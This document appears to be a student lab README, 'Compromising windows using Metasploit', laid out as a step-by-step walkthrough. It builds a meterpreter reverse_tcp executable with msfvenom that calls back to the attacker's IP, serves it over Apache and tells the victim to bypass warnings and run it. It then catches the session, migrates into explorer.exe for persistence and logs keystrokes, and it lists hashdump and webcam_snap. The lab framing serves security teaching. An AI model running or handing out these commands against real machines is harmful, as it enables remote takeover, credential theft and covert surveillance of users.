# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="1920" height="1057" alt="ifconfig" src="https://github.com/user-attachments/assets/7d6972fe-1791-446f-8eaf-24ebb55f92e7" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="955" height="1045" alt="msfvenom" src="https://github.com/user-attachments/assets/90b11cb1-6e58-4023-bcb0-e8ad0bcd1966" />



copy the fun.exe into the apache ```/var/www/html ```folder

<img width="747" height="136" alt="image" src="https://github.com/user-attachments/assets/fe61944e-1cb4-4d37-84c0-27292ae5522c" />


Start apache server ```sudo systemctl apache2 start``` 
<img width="733" height="157" alt="image" src="https://github.com/user-attachments/assets/b3cee935-dc49-49d2-aa2e-f9387912ae5e" />




Check the status of apache2 ```sudo apache2 status```

<img width="807" height="361" alt="image" src="https://github.com/user-attachments/assets/edb1c435-a376-4f64-acd9-40c372eaced6" />

Invoke msfconsole:
<img width="1920" height="1057" alt="msfconsole" src="https://github.com/user-attachments/assets/ce61d3cc-1160-4a12-b699-7aeee5ddc3eb" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
<img width="955" height="1045" alt="msf help" src="https://github.com/user-attachments/assets/a5f99df9-1062-4100-ae6c-3aede0d45c0e" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="811" height="447" alt="image" src="https://github.com/user-attachments/assets/a1744b03-4778-4a66-8980-2064373ed0e2" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="814" height="372" alt="image" src="https://github.com/user-attachments/assets/8fdd703c-3aa6-4a07-982c-80868e08d703" />


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="821" height="317" alt="image" src="https://github.com/user-attachments/assets/3c290d74-acee-40d7-ac1c-c909bc4d3008" />


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far

<img width="808" height="606" alt="image" src="https://github.com/user-attachments/assets/6b4f52a4-feff-49d3-998b-e27b03be7783" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

